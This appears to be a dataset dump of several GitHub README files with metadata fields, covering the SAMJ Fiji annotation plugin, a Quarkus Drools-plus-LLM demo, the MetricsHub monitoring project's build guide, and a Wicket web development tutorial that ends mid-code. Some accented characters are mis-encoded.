The images (top center and bottom center in the figure) showcase the results of mobility assays for *Pseudomonas aeruginosa* strains on agar plates [2]. These assays are crucial for studying the surface motility of bacteria, which is considered a key factor in pathogenicity due to its role in chemotaxis, biofilm formation, and overall virulence. The original images depict the spread of bacteria on agar plates following incubation, captured using the Chemi DOCâ„¢ image system. The annotations made using the SAMJ plugin allow for precise measurement and analysis of the spread area, significantly automating a task that was previously manual, tedious, and time-consuming. By leveraging SAMJ for these annotations, researchers can efficiently quantify bacterial motility, facilitating deeper insights into bacterial behavior and its implications on disease spreading and antimicrobial resistance. This enhances the plugin's value in microbial research, providing a robust tool for assessing bacterial dynamics in a consistent and reproducible manner.

#### c) Organoids
The images (top right and bottom right in the figure) illustrate organoids captured for the purpose of segmentation, counting, and analysis of morphological features such as area and eccentricity [3]. These organoids are typically used to model biological processes in vitro, providing a robust platform for studies in developmental biology, disease pathology, and drug screening. The original images capture the diverse shapes and sizes of organoids, which can be challenging to quantify manually. Using the SAMJ plugin, researchers can automate the segmentation and counting of organoids, and accurately measure their area and eccentricity. This annotation capability not only enhances the precision and efficiency of the analysis but also supports high-throughput screening and detailed morphometric assessments. The ability of SAMJ to handle such complex image data demonstrates its utility in advanced biological research and experimental reproducibility.



#### References
[1] Gomezâ€Cruz, C., Fernandezâ€de la Torre, M., Lachowski, D., Pradosâ€deâ€Haro, M., del RÃ­o HernÃ¡ndez, A. E., Perea, G., ... & Garciaâ€Gonzalez, D. (2024). Mechanical and Functional Responses in Astrocytes under Alternating Deformation Modes Using Magnetoâ€Active Substrates. Advanced Materials, 2312497.

[2] Casado-Garcia, A., ChichÃ³n, G., Dominguez, C., Garcia-Dominguez, M., Heras, J., Ines, A., ... & Saenz, Y. (2021). MotilityJ: An open-source tool for the classification and segmentation of bacteria on motility images. Computers in biology and medicine, 136, 104673.

[3] Segmentation, counting, and measurement of area and eccentricity (circularity) of organoids in [image.sc forum](https://forum.image.sc/t/segmentation-counting-measurement-of-area-and-eccentricity-circularity-of-organoids/90751)

## Contributors

**Carlos GarcÃ­a-LÃ³pez-de-Haro**, *Bioimage Analysis Unit, Institut Pasteur, UniversitÃ© Paris CitÃ©, Paris, France* - [@carlosuc3m](https://github.com/carlosuc3m)  
**Caterina Fuster-BarcelÃ³**, *Bioengineering Department, Universidad Carlos III de Madrid, LeganÃ©s, Spain* - [@cfusterbarcelo](https://github.com/cfusterbarcelo)  
**Curtis T. Rueden**, *Center for Quantitative Cell Imaging, University of Wisconsin, Madison, USA* - [@ctrueden](https://github.com/ctrueden)  
**JÃ³nathan Heras**, *Department of Mathematics and Computer Science, University of La Rioja, LogroÃ±o, Spain* - [@joheras](https://github.com/joheras)  
**Vladimir Ulman**, *IT4Innovations, VSB - Technical University of Ostrava, Ostrava, Czech Republic* - [@xulman](https://github.com/xulman)  
**AdriÃ¡n InÃ©s**, *Department of Mathematics and Computer Science, University of La Rioja, LogroÃ±o, Spain* - [@adines](https://github.com/adines)  
**Kevin Eliceri**, *Center for Quantitative Cell Imaging, University of Wisconsin, Madison, USA*  - [@eliceiri](https://github.com/eliceiri)  
**J.C. Olivo-Marin**, *CNRS UMR 3691, Institut Pasteur, Paris, France*  
**Daniel Sage**, *Biomedical Imaging Group and Center for Imaging, Ã‰cole Polytechnique FÃ©dÃ©rale de Lausanne (EPFL), Lausanne, Switzerland* - [@dasv74](https://github.com/dasv74)  
**Arrate MuÃ±oz-Barrutia**, *Bioengineering Department, Universidad Carlos III de Madrid, LeganÃ©s, Spain* - [@arratemunoz](https://github.com/arratemunoz)


## Notes

- This plugin is intended to use with microscopy images.
- The documentation here is for users only. Developer documentation, including contribution guidelines, will be available in a separate repository.
- For further assistance or to report issues, please visit the [plugin's repository](https://github.com/segment-anything-models-java/SAMJ-IJ).

Thank you for using the SAMJ-IJ Fiji plugin!
",0,11,2,9.0,"['content', 'fiji', 'plugin', 'installation', 'model', 'installation', 'annotate', 'image', 'save', 'annotation', 'all', 'roi', 'large', 'one', 'export', 'label', 'usage', 'example', 'use', 'case', 'a', 'astrocytes', 'stained', 'actin', 'b', 'bacterial', 'mobility', 'agar', 'plate', 'c', 'organoids', 'reference', 'contributor', 'note']","['installation', 'content', 'fiji', 'plugin', 'model']",1.0,[],0.0,1.0,0.0
mariofusco/quarkus-drools-llm,main,"# Machine Learning + Symbolic Reasoning: a Quarkus story on Artificial Intelligence

| Hybrid Reasoning in a nutshell | 
|---| 
| Hybrid reasoning, also known as [Neuro-symbolic AI](https://en.wikipedia.org/wiki/Neuro-symbolic_AI), is a type of artificial intelligence mixing Machine Learning and Symbolic Reasoning in order to complement each other, covering with second the areas where the first falls short, like the lacks of reliability, reproducibility and transparency.<br/><br/>The main idea behind this project is showing, with simple but compelling examples, how hybrid reasoning, and in particular how mixing an LLM with a rule engine, could allow to implement chatbots in different business domains that are both user-friendly and capable of applying the business rules of that specific domain in a rigorous way and without suffering of any hallucinations. |

## Power is nothing without control

What you can do nowadays with LLM systems like ChatGPT is simply mind-blowing. I must admit that I cannot stop being surprised and from time to time literally jumping from my seat thinking: ""I didn't imagine that AI could do ALSO this!"". What is a bit misleading here is that what we now call and tend to identify with Artificial Intelligence is actually Deep Learning which is only a subset of all AI technologies available.

![](images/AI-ML-DL-1.png)

In other words Deep Learning is only a fraction of the whole AI-story. Moreover, there are many situations where being surprised is the last thing that you may want. You don't want to jump from your seat when your bank refuses to concede you a mortgage without any human understandable or trackable reason, but only because an LLM said no. And even the bank may want to grant their mortgages only to applicants who are considered viable under their strict, well-defined and not questionable business rules.

In essence, the power and flexibility that a well-trained Deep Learning model gives is virtually infinite, but as already discussed in many academical papers, given their statistical nature, they cannot be completely reliable and major drawbacks like hallucinations are unavoidable. 

![Hallucinations.png](images%2FHallucinations.png)

In reality, what you often need, at least in some parts of your application, is a more confined and absolutely predictable control, in order to make it coherent with your business domain and obey flawlessly to its rules.

## Combining LLM flexibility and rule engine predictability

Given these premises why not mixing 2 very different and complementary AI branches like deep learning and symbolic reasoning? Moving forward with the mortgage example, this will give us a chance to implement an application with the corporate rigor required by the strict business rules of a bank, but queryable in the most human friendly possible way.

The goal of this project is to demonstrate how [Quarkus](https://quarkus.io/), with the help of its [Drools](https://www.drools.org/) and [LangChain4j](https://github.com/langchain4j/langchain4j) extensions, allows to easily integrate these 2 technologies and combine them to implement this mortgage example and other interesting use cases. 

## Installing and integrating a local LLM engine

LangChain4j provides an abstraction on top of an underlying LLM, so you could switch between different implementations, and for example integrate ChatGPT, with very few configuration changes. In order to have a self-contained application, not relying on any external service, the current configuration uses on a locally running [Ollama](https://github.com/ollama/ollama) server. 

Ollama has a [library](https://ollama.com/library) with quite a long list of different models. This project defaults to a model called Mistral 7B that offers a good compromise between system requirements and capabilities. This choice has been configured in the Quarkus application.properties file as it follows: 

```properties
# Configure Ollama server to use Mistral 7B model
quarkus.langchain4j.ollama.chat-model.model-id=mistral
# Choose a low temperature to minimize hallucination
quarkus.langchain4j.ollama.chat-model.temperature=0.1
# Set timeout to 3 minutes (local LLM can be quite slow)
quarkus.langchain4j.ollama.timeout=180s
# Enable logging of both requests and responses
quarkus.langchain4j.ollama.log-requests=true
quarkus.langchain4j.ollama.log-responses=true
```

For detailed instructions of Ollama please refer to the [Ollama](https://github.com/ollama/ollama) documentation, but for example, you can start the containerized server with Mistral model by the following command in order to run this application:
```shell script
docker run -d -v ollama:/root/.ollama -p 11434:11434 --name ollama ollama/ollama
docker exec -it ollama ollama run mistral
```

## Running the application

### Using the dev mode

You can run your application in dev mode that enables live coding using:
```shell script
./mvnw compile quarkus:dev
```

Once the application is running you can connect to the [port 8080 of your localhost](http://localhost:8080/) and will obtain a simple index page only containing a list of links to the examples provided by this project. We will analyze these examples in more details in the second part of this document.

### Packaging and running the application

The application can be packaged using:
```shell script
./mvnw package
```
It produces the `quarkus-run.jar` file in the `target/quarkus-app/` directory.
Be aware that itâ€™s not an _Ã¼ber-jar_ as the dependencies are copied into the `target/quarkus-app/lib/` directory.

The application is now runnable using `java -jar target/quarkus-app/quarkus-run.jar`.

If you want to build an _Ã¼ber-jar_, execute the following command:
```shell script
./mvnw package -Dquarkus.package.type=uber-jar
```

The application, packaged as an _Ã¼ber-jar_, is now runnable using `java -jar target/*-runner.jar`.

### Creating a native executable

You can create a native executable using: 
```shell script
./mvnw package -Dnative
```

Or, if you don't have GraalVM installed, you can run the native executable build in a container using: 
```shell script
./mvnw package -Dnative -Dquarkus.native.container-build=true
```

You can then execute your native executable with: `./target/quarkus-drools-llm-1.0.0-SNAPSHOT-runner`

If you want to learn more about building native executables, please consult https://quarkus.io/guides/maven-tooling.

## The mortgage example

As anticipated this first and simplest example combines Drools and a LLM with the purpose of allowing our user to interact with a bank chatbot in the smoothest and less structured possible way, but still applying the cold and inflexible [business rules](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/org/hybridai/mortgage/mortgage.drl) of the bank when a decision about the grant of the mortgage has to be taken. 

Actually the implemented rule requirements are very basic, it's enough to have a sufficient income and of course to be adult, so when we type something like

```
Mario the firstborn of the Fusco family is born the 18th day of March 1974. Nowadays he works as software engineer and earns a quarter million a year.
```
the chatbot gently answers

```
Yes, mortgage can be granted to Mario Fusco
```

It's interesting to understand what's happening under the hood here. The application, through the langchain4j integration, asks to the LLM to extract from the input message the relavant data of the mortgage applicant.

```json
{""model"":""mistral"",""prompt"":""Extract information about a person from {\""message\"":\""Mario the firstborn of the Fusco family is born the 18th day of March 1974 Nowadays he works as software engineer and earns a quarter million a year\""}. When income is null, it is set to 0. The response must contain only the JSON with person's data and without any other sentence.\nYou must answer strictly in the following JSON format: {\n\""firstName\"": (type: string),\n\""lastName\"": (type: string),\n\""birthDate\"": (type: date string (2023-12-31)),\n\""income\"": (type: integer),\n}"",""options"":{""temperature"":0.1,""num_predict"":128,""top_p"":0.9,""top_k"":40},""stream"":false}
```

As requested the LLM replies with a JSON containing those data

```json
{""firstName"": ""Mario"", ""lastName"": ""Fusco"", ""birthDate"": ""1974-03-18"", ""income"": 250000}
```

that are automatically translated by LangChain4j into an instance of the `Person` class. At this point it is straightforward to insert this `Person` object into a Drools session and let it evaluate the bank business rules against it.

The other nice (and in similar situations also very likely required) advantage of this solution is that a rule engine is a completely transparent and trackable form of artificial intelligence, so if you write something like:

```
Sofia the daughter of Mario Fusco is born on the 26th day of the ninth month of 2011. She is a very smart student.
```

not only the system correctly refuses to the grant the mortgage but also explain the reasons of this denial.

```
Mortgage cannot be granted to Sofia Fusco because [Sofia Fusco is too young, Sofia Fusco's income is too low]
```

## The password generator example

Having to generate a strong but easy to remember password is a very common task that from time to time we are asked to perform while browsing the internet, so why not taking advantage of the creativity of an LLM for this? 

Actually in this situation we don't need a fully reliable LLM. Conversely, it is more important if it could be even more creative than usual. To do so we can raise the LLM temperature that is a parameter that influences the language model's output, determining whether the output is more random and creative or more predictable. A higher temperature will result in lower probability, i.e more creative outputs. 

Thanks to the Quarkus integration this is easily achievable defining [a second and _hotter_ LLM model](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/application.properties#L13) and [configuring the password generator to use it](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/java/org/hybridai/password/PasswordGenerator.java#L8). 

In this way, we could for instance ask to the LLM to generate a random word that relates with `football` and it could reply `goalkeeper`.

Unfortunately almost never we're allowed to use such a simple word as a password. Actually a password should obey to a few simple rules, such as having a certain length and containing at least a capital letter, a digit, a symbol and the blood of a black roaster killed on a full moon night.

With these premises it is natural to [encode these rules](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/org/hybridai/password/password.drl) with Drools and let the rule engine to apply them for you transforming the word originally suggested by the LLM into the more secure `G0alk&&p`.

## The airline chatbot example 

This example has been inspired by a recent chatbot horror story demonstrating once again how LLM are not completely reliable to be employed alone in business critical application. 

![](images/aircanada.png)

The idea here is to keep using the LLM to provide a friendly chatbot, but leveraging a more predictable rule engine when it is necessary to decide if the customer is eligible for a refund and of which amount.

In this example the [business rules](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/org/hybridai/refund/calculator/refund.drl) are simple: a customer can have a refund of $2 for each minute of delay (if the flight had at least one hour of delay) plus a 10% in case of a senior customer (older than 65). 

The rule engine however is not only used to calculate the final refund amount, but also to define [another set of rules](https://github.com/mariofusco/quarkus-drools-llm/blob/main/src/main/resources/org/hybridai/refund/statemachine/statemachine.drl) implementing a state machine. This state machine has the purpose of guiding our chatbot through the different stages of the data acquisition, selecting right the data extractor for the current stage. In essence the architecture of our chatbot could be visually summarized in this way.

![llm_drools.png](images%2Fllm_drools.png)

Giving a try to this setup you could for instance experience a conversation with our chatbot like the following.

![](images/refund.png)

This outcome is coeherent with the business rules described above, in fact the 4 hours, 240 minutes, correspond to a refund of $480, plus the 10% since the customer is 70 years old, giving a total of $528. Note that since the sequence of business rules applied by the engine is fully transparent and auditable, this also the chatbot to provide the customer with a clear explanation of how his refund has been calculated. 
",0,0,2,3.0,"['machine', 'learning', 'symbolic', 'reasoning', 'quarkus', 'story', 'artificial', 'intelligence', 'power', 'nothing', 'without', 'control', 'combine', 'llm', 'flexibility', 'rule', 'engine', 'predictability', 'instal', 'integrate', 'local', 'llm', 'engine', 'configure', 'ollama', 'server', 'use', 'mistral', 'model', 'choose', 'low', 'temperature', 'minimize', 'hallucination', 'set', 'timeout', 'minute', 'local', 'llm', 'quite', 'slow', 'enable', 'log', 'request', 'response', 'run', 'application', 'use', 'dev', 'mode', 'package', 'run', 'application', 'create', 'native', 'executable', 'the', 'mortgage', 'example', 'the', 'password', 'generator', 'example', 'the', 'airline', 'chatbot', 'example']","['llm', 'the', 'example', 'engine', 'local']",1.0,"[io.quarkus.platform:quarkus-maven-plugin,maven-compiler-plugin,maven-failsafe-plugin,maven-surefire-plugin]",0.0,1.0,0.0
sentrysoftware/metricshub,main,"# MetricsHub

![GitHub release (with filter)](https://img.shields.io/github/v/release/sentrysoftware/metricshub)
![Build](https://img.shields.io/github/actions/workflow/status/sentrysoftware/metricshub/maven-deploy.yml)
![GitHub top language](https://img.shields.io/github/languages/top/sentrysoftware/metricshub)
![License](https://img.shields.io/github/license/sentrysoftware/metricshub)

## Structure

This is a multi-module project:

* **/**: The root (parent of all submodules)
* **metricshub-engine**: The brain, the heart of this project. It houses the core logic and essential functionalities that power the entire system.
* **metricshub-agent**: The MetricsHub Agent module includes a Command-Line Interface (CLI) and is responsible for interacting with the MetricsHub engine. It acts as an entry point, collecting and transmitting data to the OpenTelemetry Collector.
* **metricshub-classloader-agent**: Manages class loading for extensions, ensuring that they are loaded correctly within the JVM.
* **metricshub-ipmi-extension**: Provides support for the Intelligent Platform Management Interface (IPMI) to monitor and manage hardware at the firmware level.
* **metricshub-oscommand-extension**: Allows execution of OS-level commands and scripts to gather metrics and other data from the operating system.
* **metricshub-snmp-extension-common**: Contains common functionalities and utilities used by SNMP-based extensions.
* **metricshub-snmp-extension**: Enables Simple Network Management Protocol (SNMP) for monitoring and managing network devices.
* **metricshub-snmpv3-extension**: Adds support for SNMPv3, which includes enhanced security features like authentication and encryption.
* **metricshub-sql-source-extension**:  Allows execution of SQL queries on already existing sources.
* **metricshub-win-extension-common**: Contains common functionalities and utilities used by Windows-specific extensions.
* **metricshub-wmi-extension**: Provides support for Windows Management Instrumentation (WMI) to gather detailed information about Windows systems.
* **metricshub-winrm-extension**: Enables the use of Windows Remote Management (WinRM) for remote management and monitoring of Windows-based systems.
* **metricshub-wbem-extension**: Supports the Web-Based Enterprise Management (WBEM) standard for accessing management information.
* **metricshub-ping-extension**: Enables testing the reachability of hosts using ICMP-based ping commands.
* **metricshub-jawk-extension**: Allows execution of Jawk scripts.
* **metricshub-hardware**: Hardware Energy and Sustainability module, dedicated to managing and monitoring hardware-related metrics, focusing on energy consumption and sustainability aspects.
* **metricshub-it-common**: Contains common code and utilities used by integration tests across various modules.
* **metricshub-windows**: Builds the `.zip` package for MetricsHub on Windows platforms.
* **metricshub-linux**: Builds the `.tar.gz` package of MetricsHub on Linux platforms.
* **metricshub-doc**: Houses the documentation for MetricsHub.

> [!TIP]
> Looking for connectors? Check the [MetricsHub Community Connectors](https://github.com/sentrysoftware/metricshub-community-connectors) repository.

## How to build the Project

### Requirements

* Have [Maven 3.x properly installed and configured](https://maven.apache.org/download.cgi).
* Latest LTS Release of [JDK 21](https://adoptium.net).

### Build

To build the MetricsHub package, from `./metricshub`:

```sh
$ mvn clean package
```

#### Building Windows Packages (.zip)

* **Host:** Windows
* Execute the `mvn package` command within the MetricsHub root directory (`metricshub`). You can find the `.zip` package in the `metricshub/metricshub-windows/target` directory upon completion (`metricshub-windows-<version>.zip`).

#### Building Linux Packages (.tar.gz)

* **Host:** Linux
* Execute the `mvn package` command within the MetricsHub root directory (`metricshub`). You can find the `.tar.gz` package in the `metricshub/metricshub-linux/target` directory upon completion (`metricshub-linux-<version>.tar.gz`).
  * The `Docker` package is compatible with the `debian:latest` image, it will be generated under the `metricshub/metricshub-linux/target` directory (`metricshub-linux-<version>-docker.tar.gz`).

## Checkstyle

In this project, we use Checkstyle to ensure consistent and clean Java code across our codebase. 

Maven Checkstyle Plugin is configured globally in the main `pom.xml` file, and it verifies the Java code during the build process:

```xml
	<plugin>
		<artifactId>maven-checkstyle-plugin</artifactId>
		<version>3.3.0</version>
		<configuration>
			<sourceEncoding>${project.build.sourceEncoding}</sourceEncoding>
			<configLocation>checkstyle.xml</configLocation>
		</configuration>
		<executions>
			<execution>
				<id>validate</id>
				<phase>validate</phase>
				<goals>
					<goal>checkstyle</goal>
					<goal>check</goal>
				</goals>
			</execution>
		</executions>
	</plugin>
```

The Checkstyle rules that govern our code quality and style are defined in the `./checkstyle.xml` file. It's important to adhere to these rules to maintain code consistency and quality throughout the project.

The build will fail if one or more Checkstyle rules are violated.

To perform Checkstyle analysis and generate a report on violations, navigate to the directory of the Maven project you wish check and run the following `mvn` command:

```bash
mvn checkstyle:checkstyle
```

All the encountered Checkstyle issues are reported under the `target/site` directory.

To perform Checkstyle analysis and output violations to the console, navigate to the directory of the Maven project you wish check and run the following `mvn` command:

```bash
mvn checkstyle:check
```

## Code Formatting

In this project, we maintain code formatting using [prettier-java](https://github.com/jhipster/prettier-java), a tool that helps ensure clean and consistent Java code. It automatically formats your code according to a predefined set of rules.

### Prettier Maven Plugin

To automatically format the Java code in a specific Maven module, navigate to the directory of the Maven project you wish to format and run the following `mvn` command:

```bash
mvn prettier:write
```

To validate the formatted code, navigate to the directory of the Maven project you wish to check and run the following `mvn` command:

```bash
mvn prettier:check
```

The build will fail if you forgot to run Prettier.

## Submitting a PR

Before you submit a PR, make sure to use the available tools for code formatting, and ensure that the style checks and unit tests pass.

## License

License is GNU Affero General Public License v3.0. Each source file must include the AGPL-3.0 header (build will fail otherwise).
To update source files with the proper header, simply execute the below command:

```bash
mvn license:update-file-header
```

",6,22,16,220.0,"['metricshub', 'structure', 'how', 'build', 'project', 'requirement', 'build', 'building', 'window', 'package', 'build', 'linux', 'package', 'checkstyle', 'code', 'format', 'prettier', 'maven', 'plugin', 'submit', 'pr', 'license']","['build', 'package', 'metricshub', 'structure', 'how']",22.0,"[com.googlecode.maven-download-plugin:download-maven-plugin,com.hubspot.maven.plugins:prettier-maven-plugin,maven-artifact-plugin,maven-assembly-plugin,maven-checkstyle-plugin,maven-deploy-plugin,maven-gpg-plugin,maven-invoker-plugin,maven-javadoc-plugin,maven-source-plugin,org.apache.maven.plugins:maven-antrun-plugin,org.apache.maven.plugins:maven-assembly-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-dependency-plugin,org.apache.maven.plugins:maven-enforcer-plugin,org.apache.maven.plugins:maven-failsafe-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-project-info-reports-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-shade-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:build-helper-maven-plugin,org.codehaus.mojo:buildnumber-maven-plugin,org.codehaus.mojo:exec-maven-plugin,org.codehaus.mojo:license-maven-plugin,org.jacoco:jacoco-maven-plugin,org.sentrysoftware.maven:metricshub-connector-maven-plugin,org.sonatype.plugins:attach-artifact-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin]",0.0,19.0,3.0
bitstorm/modern-webdev-wicket,main,"# Modern Web development with Apache Wicket, Spring Boot, Hazelcast and WebJars


When it comes to implement web applications, Java developers usually feel lost with modern web technologies and they might think that nowadays it's not possible to implement robust and maintainable web applications without adopting the standard JavaScript-based development stack. But what if I tell you that Java is a first-class platform also for web development and that you don't need to switch to a different technology?

The following is a list of _howto_ and example projects that show you how to use Apache Wicket and other familiar frameworks and tools from the Java ecosystem (like Hazelcast, Spring Boot, WebJars, Apache Maven, etc...) to build modern and scalable applications without leaving the Java platform.

More in details you will see how to reach the following goals:

- [Producing clean and resurce-friendly URLs](#produce-resource-friendly-urls)
- [Managing CSS and JavaScript resources with WebJars and Maven](#manage-css-and-javascript-libraries-with-webjars-and-maven)
- [Scaling your application with session clustering and caching](#use-spring-boot-and-hazelcast-to-scale-your-application-with-session-clustering-and-caching)
- [Styling your application using SCSS](#style-your-application-with-scss)

> [!NOTE]
> The following examples are based on Wicket 10 and Java 21, although they should work also for Wicket 9 and Java 17

## Produce resource-friendly URLs

#### Page mounting

Wicket already comes with a native solution to generate structured and resource-friendly URLs by mounting pages to a specific path:

```java
mountPage(""/path/to/page"", MountedPage.class);
```

The path used for mounted pages can contain also segments with dynamic values and they are declared using a special syntax:

```java
/*
 In the following example the path used to mount UserPage has a required parameter
 (userId) and an optional one (taxId).

 For example the following path are both valid:
  - ""/user/123/details/ABC1234567""
  - ""/user/123/details""
*/

mountPage(""/user/${userId}/details/#{taxId}"", UserPage.class);
```

For a full description of page mounting see the related [user guide paragraph](https://nightlies.apache.org/wicket/guide/10.x/single.html#_generating_structured_and_clear_urls)


#### Remove page id from URL

By default Wicket uses a _versioning_ system for stateful pages assiging a incremental id to each version of the pages. This id is usually appended as query parameter at the end of the page's URL:

```
www.myhost.net/page-path?1234
```

The purpose of page versioning is to support browserâ€™s back button: when this button is pressed Wicket must respond by rendering the same page instance previously used.
Again, for a full description of this mechanism see the related [user guide paragraph](https://nightlies.apache.org/wicket/guide/10.x/single.html#_page_versioning_and_caching)

Usually having this id at the end of the page URL is not a big deal, but sometimes you might prefer simply hiding it in the final URL.  

```java
public class NoPageIdMapper extends MountedMapper {

    public NoPageIdMapper(String mountPath, Class<? extends IRequestablePage> pageClass) {
        super(mountPath, pageClass);
    }

    @Override
    protected void encodePageComponentInfo(Url url, PageComponentInfo info) {
        //if componentInfo is null we have a page url and we skip page parameters, otherwise we keep them
        if (info.getComponentInfo() != null) {
            super.encodePageComponentInfo(url, info);
        }

    }
}
```
Please note that this mapper will remove version id only for page URLs, so stateful behaviors (like AJAX behaviors) will continue to work as usual.  

Once we created our custom mapper we must use it to mount our pages: 

```java
public void init()
{
	super.init();

	NoPageIdMapper mapper = new NoPageIdMapper(path, pageClass);
	mount(mapper);
}
```

> [!WARNING]
> Keep in mind that by removing the page id from URL you will lost the browserâ€™s back button support.

## Manage CSS and JavaScript libraries with WebJars and Maven

WebJars is a project aimed to provide client-side libraries distributions as Maven dependency. In this way these libraries can be read directly from JAR files as regular dependecies. WebJars comes with numerous Java libraries to easily integrate this framework with the most popular web frameworks, Wicket included.

For example (project _wicket-webjars_) let's say we want to use Bootstrap 5.3.3 in our Wicket application. The first step is to include the following dependecies in our pom.xml:

```xml
<dependency>
    <groupId>de.agilecoders.wicket.webjars</groupId>
    <artifactId>wicket-webjars</artifactId>
    <version>4.0.3</version>
</dependency>

<dependency>
    <groupId>org.webjars.npm</groupId>
    <artifactId>bootstrap</artifactId>
    <version>5.3.3</version>
</dependency>
```

The first dependency is the library that allows to use WebJars with Wicket while the second is the Bootstrap library distributed by WebJars project.
The second configuration step is the initialization of _wicket-webjars_ library with the following simple code line in our application _init()_ method:

```java
public void init()
{
	super.init();

	// init wicket-webjars library
	WicketWebjars.install(this);
}
```

Now we can add Bootstrap to our page as Wicket CssHeaderItem using reference class _WebjarsCssResourceReference_

```java
@Override
public void renderHead(IHeaderResponse response) {
	super.renderHead(response);

	response.render(CssHeaderItem.forReference(
               new WebjarsCssResourceReference(""bootstrap/5.3.3/css/bootstrap.min.css"")));

}
```

The path used with _WebjarsCssResourceReference_ is appendend to _META-INF/resources/webjars/_ to obtain the path to the desired file inside the library jar. See the [official WebJars site](https://www.webjars.org) to have a look at the content of jar libraries.

To automatically use the version of a WebJar library from your pom.xml, we can simply replace the version in path with the _current_ string. When a resource name is resolved this string will be replaced with the most recent available version in classpath: 


```java
@Override
public void renderHead(IHeaderResponse response) {
	super.renderHead(response);

	response.render(CssHeaderItem.forReference(
               new WebjarsCssResourceReference(""bootstrap/current/css/bootstrap.min.css"")));

}
```

It is also possible to use a resource directly from html markup prepending _/webjars/_ to the resource path:

```html
<link rel='stylesheet' href='/webjars/bootstrap/5.3.3/css/bootstrap.min.css'>
```

> [!WARNING]
> If you are using Jetty remember that resource can be used from html only from version 12.

The project can be started with command `mvn jetty:run`. The page can be seen opening your browser at [http://localhost:8080](http://localhost:8080)

## Use Spring Boot and Hazelcast to scale your application with session clustering and caching

Scaling a web application is not a trivial task and it usually involves a lot of work on additional architectural aspects such as caching, services orchestration and replication, etc... Java developers can count on different valuable frameworks that can dramatically help handling those aspects providing a distributed data storage that can be used both as caching service and coordinator between two or more JVM. One of these framework is [Hazelcast](https://hazelcast.com/) which can be used also for web session clustering. 

In this example (project _wicket-hazelcast_) we will see how to use integrate Wicket with Spring Boot and Hazelcast to share and replicate web session among two or more server instances making our application fault tolerant and scalable.

Our application is a Spring Boot-based web application using Apache Wicket. Let's see the required dependecies to our pom.xml:


```xml
<!-- SESSION REPLICATION -->
<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-core</artifactId>
    <version>3.2.2</version>
</dependency>

<dependency>
    <groupId>org.springframework.session</groupId>
    <artifactId>spring-session-hazelcast</artifactId>
    <version>3.2.2</version>          
</dependency>

<!-- WICKET SPRING BOOT INTEGRATION -->
<dependency>
  <groupId>com.giffing.wicket.spring.boot.starter</groupId>
  <artifactId>wicket-spring-boot-starter</artifactId>
  <version>4.0.0</version>        
</dependency>

<!-- WICKET HAZELCAST INTEGRATION -->
<dependency>
    <groupId>org.wicketstuff</groupId>
    <artifactId>wicketstuff-datastore-hazelcast</artifactId>
    <version>10.0.0</version>
</dependency>

<!-- SPRING HAZELCAST INTEGRATION (for caching) -->
<dependency>
    <groupId>com.hazelcast</groupId>
    <artifactId>hazelcast-spring</artifactId>
    <version>5.3.6</version>
</dependency>
```

The main dependency is probably the one on [Wicket and Spring Boot integration project](https://github.com/MarcGiffing/wicket-spring-boot) (artifactId _wicket-spring-boot-starter_) which lays the foundation for our application.
The other dependencies are for Hazelcast integration with Spring and Wicket and for web session clustering.

Now let's look at the code starting with the configuration required to create an _HazelcastConfig_ instance for our application. This is basically the code used in the official [Hazelcast tutorial](https://docs.hazelcast.com/tutorials/spring-session-hazelcast)


```java
@Configuration
@EnableHazelcastHttpSession
@EnableCaching
public class HazelcastConfig {

    @SpringSessionHazelcastInstance
    @Bean(destroyMethod = ""shutdown"")
    public HazelcastInstance hazelcastInstance() {
        Config config = new Config();

        JoinConfig join = config.getNetworkConfig().getJoin();
        // enabling multicast for autodiscovery.
        join.getMulticastConfig().setEnabled(true);

        AttributeConfig attributeConfig = new AttributeConfig()
                .setName(HazelcastIndexedSessionRepository.PRINCIPAL_NAME_ATTRIBUTE)
                .setExtractorClassName(PrincipalNameExtractor.class.getName());

        config.getMapConfig(HazelcastIndexedSessionRepository.DEFAULT_SESSION_MAP_NAME)
            .addAttributeConfig(attributeConfig).addIndexConfig(
                new IndexConfig(IndexType.HASH, HazelcastIndexedSessionRepository.PRINCIPAL_NAME_ATTRIBUTE));
        
        // use custom serializer for better performances. This is optional.
        SerializerConfig serializerConfig = new SerializerConfig();
        serializerConfig.setImplementation(new HazelcastSessionSerializer()).setTypeClass(MapSession.class);
        config.getSerializationConfig().addSerializerConfig(serializerConfig);

        return Hazelcast.newHazelcastInstance(config);
    }

    @Bean
    public CacheManager cacheManager(HazelcastInstance hazelcastInstance) {
        return new HazelcastCacheManager(hazelcastInstance);
    }

}
```

In the class above we used two annotation (beside _@Configuration_), one to enable session clustering with Hazelcast (_@EnableHazelcastHttpSession_) and another to enable Spring caching support (_@EnableCaching_) backed by Hazelcast. Spring caching requires to create a bean of type _CacheManager_

> [!NOTE]
> Spring caching is enabled only for illustration purpose as it's not used in the example code. However with a _CacheManager_ bean created, you can use Spring annotations to [cache the results of you services](https://www.baeldung.com/spring-cache-tutorial).

> [!WARNING]
> Please note that for sake of simplicity we enabled multicast for autodiscovery, so Hazelcast will automatically add to the cluster any new application instance visible on our local network. Keep in mind that multicast is usually not suited for production environment where a safer join configuration is usually required. See the [Hazelcast documentation](https://docs.hazelcast.com/hazelcast/5.4/clusters/network-configuration) for more information on network configuration.


As final configuration step we must tell Wicket to store statefull page instances using Hazelcast. This is done inside Application _init()_ method registering a custom _PageManagerProvider_ using class _HazelcastDataStore_ from WicketStuff project. We also use class _SessionQuotaManagingDataStore_ to limit page storing to max 4 instances per session:

```java
@Override
public void init()
{
	super.init();

	// add your configuration here
	HazelcastInstance instance = getApplicationContext().getBean(HazelcastInstance.class);

	setPageManagerProvider(new DefaultPageManagerProvider(this) {
	    @Override
	    protected IPageStore newPersistentStore() {
		HazelcastDataStore hazelcastDataStore = new HazelcastDataStore(getName(), instance);
	
		return new SessionQuotaManagingDataStore(hazelcastDataStore, 4);
	    }
